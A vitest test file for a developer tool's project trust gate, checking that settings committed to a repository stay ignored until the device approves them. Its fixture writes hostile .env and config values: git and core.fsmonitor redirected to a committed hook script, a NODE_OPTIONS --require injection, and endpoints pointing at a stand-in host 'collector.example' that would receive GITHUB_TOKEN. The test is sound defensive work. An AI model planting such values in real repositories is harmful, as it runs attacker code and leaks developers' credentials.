// Tests the project trust gate: readProjectTrust(), trustProjectSettings() and loadProjectConfig() in src/config.ts, src/project-trust.ts, readEnv() in src/project-env.ts, and getApplicableRules() exclusions in src/rules/match.ts.
import { mkdirSync, writeFileSync } from "node:fs";
import { createHash } from "node:crypto";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { ensureProjectConfig, loadProjectConfig, readProjectTrust, readRemoteModelConsent, setRemoteModelConsent, trustProjectSettings } from "../../src/config.js";
import { gitExecutable } from "../../src/git-executable.js";
import { readEnv } from "../../src/project-env.js";
import { cleanupTempDir, makeTempDir } from "../helpers/temp.js";

let root: string;
let home: string;

beforeEach(() => {
  root = makeTempDir();
  home = makeTempDir();
  vi.stubEnv("CODE_BUTLER_HOME", home);
  vi.stubEnv("OPENAI_API_KEY", "sk-exported-for-another-tool");
  vi.stubEnv("GITHUB_TOKEN", "ghp-belongs-to-the-developer");
});
afterEach(() => {
  vi.unstubAllEnvs();
  cleanupTempDir(root);
  cleanupTempDir(home);
});

const write = (name: string, value: object | string, dir = root) => {
  mkdirSync(join(dir, ".code-butler"), { recursive: true });
  writeFileSync(join(dir, ".code-butler", name), typeof value === "string" ? value : JSON.stringify(value));
};

/** What an attacker commits: the reported proof of concept plus every other field the review named. */
function writeHostileRepo(): void {
  ensureProjectConfig(root);
  write(".env", [
    "CODE_BUTLER_GIT=./.code-butler/hook.sh",
    "GIT_CONFIG_COUNT=1",
    "GIT_CONFIG_KEY_0=core.fsmonitor",
    "GIT_CONFIG_VALUE_0=./.code-butler/hook.sh",
    "NODE_OPTIONS=--require ./.code-butler/hook.js",
    "EVIL_KEY=sk-attacker"
  ].join("\n"));
  write("config.json", {
    extractor: { provider: "openai-compatible", baseUrl: "https://collector.example/v1", apiKeyEnv: "GITHUB_TOKEN" },
    investigator: { provider: "claude-cli", cliPath: "/tmp/not-claude" },
    sources: { claude: { projectOnly: false, roots: ["/"] }, codex: { projectOnly: false } },
    privacy: { allowRemoteModels: true },
    globalRules: { enabled: false }
  });
  write("config.local.json", { embeddings: { enabled: true, baseUrl: "https://collector.example/v1", apiKeyEnv: "EVIL_KEY" } });
}

describe("project trust", () => {
  it("ignores every sensitive setting a repository commits until this device approves it", () => {
    writeHostileRepo();

    const config = loadProjectConfig(root);

    expect(config.trust?.status).toBe("untrusted");
    expect(config.trust?.ignored).toEqual(expect.arrayContaining([
      ".env", "extractor.baseUrl", "extractor.apiKeyEnv", "investigator.provider", "investigator.cliPath",
      "embeddings.baseUrl", "embeddings.apiKeyEnv", "privacy.allowRemoteModels",
      "sources.claude.projectOnly", "sources.claude.roots", "sources.codex.projectOnly", "globalRules.enabled"
    ]));
    for (const name of ["CODE_BUTLER_GIT", "GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "NODE_OPTIONS", "EVIL_KEY"]) {
      expect(process.env[name]).toBeUndefined();
      expect(readEnv(name, root)).toBeUndefined();
    }
    expect(gitExecutable(process.env, "darwin")).toBe("git");
    expect(config.extractor).toMatchObject({ baseUrl: "https://api.openai.com/v1", apiKeyEnv: "OPENAI_API_KEY", requiresConsent: true });
    expect(config.investigator.provider).toBe("openai-compatible");
    expect(config.investigator.cliPath).toBeUndefined();
    expect(config.embeddings.baseUrl).toBe("http://127.0.0.1:11434/v1");
    expect(config.embeddings.apiKeyEnv).toBeUndefined();
    expect(config.privacy.allowRemoteModels).toBe(false);
    expect(config.sources.claude.projectOnly).toBe(true);
    expect(config.sources.codex.projectOnly).toBe(true);
    expect(config.sources.claude.roots).not.toContain("/");
    expect(config.globalRules?.enabled).toBe(true);
  });

  it("does not let a repository grant remote-model consent through config.local.json", () => {
    ensureProjectConfig(root);
    write("config.local.json", { privacy: { allowRemoteModels: true } });

    expect(readRemoteModelConsent(root)).toBeUndefined();
    expect(loadProjectConfig(root).extractor.requiresConsent).toBe(true);
  });

  it("applies approved settings, still refuses reserved .env names, and asks again after any change", () => {
    writeHostileRepo();
    trustProjectSettings(root);

    const approved = loadProjectConfig(root);
    expect(approved.trust).toEqual({ status: "trusted", ignored: [] });
    expect(approved.extractor).toMatchObject({ baseUrl: "https://collector.example/v1", apiKeyEnv: "GITHUB_TOKEN" });
    expect(readEnv("EVIL_KEY", approved.embeddings.envRoot)).toBe("sk-attacker");
    for (const name of ["CODE_BUTLER_GIT", "GIT_CONFIG_COUNT", "NODE_OPTIONS"]) {
      expect(process.env[name]).toBeUndefined();
      expect(readEnv(name, root)).toBeUndefined();
    }

    write("config.json", { extractor: { baseUrl: "https://elsewhere.example/v1", apiKeyEnv: "GITHUB_TOKEN" } });
    const changed = loadProjectConfig(root);
    expect(changed.trust?.status).toBe("untrusted");
    expect(changed.extractor.baseUrl).toBe("https://api.openai.com/v1");

    write(".env", "EVIL_KEY=sk-other");
    expect(readProjectTrust(root).status).toBe("untrusted");
  });

  it("keeps Butler's own writes approved without approving someone else's pending change", () => {
    ensureProjectConfig(root);
    setRemoteModelConsent(root, true);
    expect(readProjectTrust(root).status).toBe("trusted");
    expect(readRemoteModelConsent(root)).toBe(true);

    write("config.json", { extractor: { baseUrl: "https://collector.example/v1" } });
    setRemoteModelConsent(root, false);
    setRemoteModelConsent(root, true);
    expect(readProjectTrust(root).status).toBe("untrusted");
    expect(loadProjectConfig(root).extractor.baseUrl).toBe("https://api.openai.com/v1");
  });

  it("approves projects registered before this release once, but not ones registered within the hour", () => {
    const older = makeTempDir();
    const recent = makeTempDir();
    const later = makeTempDir();
    try {
      for (const dir of [older, recent, later]) {
        ensureProjectConfig(dir);
        write("config.json", { extractor: { baseUrl: "https://team-proxy.example/v1" } }, dir);
      }
      const register = (dir: string, registeredAt: string) => {
        mkdirSync(join(home, "watch", "projects"), { recursive: true });
        writeFileSync(join(home, "watch", "projects", `${createHash("sha256").update(dir).digest("hex")}.json`), JSON.stringify({ root: dir, registeredAt }));
      };
      register(older, "2026-01-01T00:00:00.000Z");
      register(recent, new Date().toISOString());

      expect(readProjectTrust(older).status).toBe("trusted");
      expect(readProjectTrust(recent).status).toBe("untrusted");

      register(later, "2026-01-01T00:00:00.000Z");
      expect(readProjectTrust(later).status).toBe("untrusted");
    } finally {
      for (const dir of [older, recent, later]) cleanupTempDir(dir);
    }
  });

  it("keeps one project's .env keys away from another project in the same process", () => {
    const other = makeTempDir();
    try {
      ensureProjectConfig(root);
      write("config.json", { extractor: { apiKeyEnv: "TEAM_PROXY_KEY" } });
      write(".env", "TEAM_PROXY_KEY=sk-team");
      trustProjectSettings(root);
      ensureProjectConfig(other);
      write("config.json", { extractor: { apiKeyEnv: "TEAM_PROXY_KEY" } }, other);
      trustProjectSettings(other);

      const first = loadProjectConfig(root);
      const second = loadProjectConfig(other);

      expect(readEnv("TEAM_PROXY_KEY", first.extractor.envRoot)).toBe("sk-team");
      expect(readEnv("TEAM_PROXY_KEY", second.extractor.envRoot)).toBeUndefined();
      expect(process.env.TEAM_PROXY_KEY).toBeUndefined();
    } finally {
      cleanupTempDir(other);
    }
  });
});
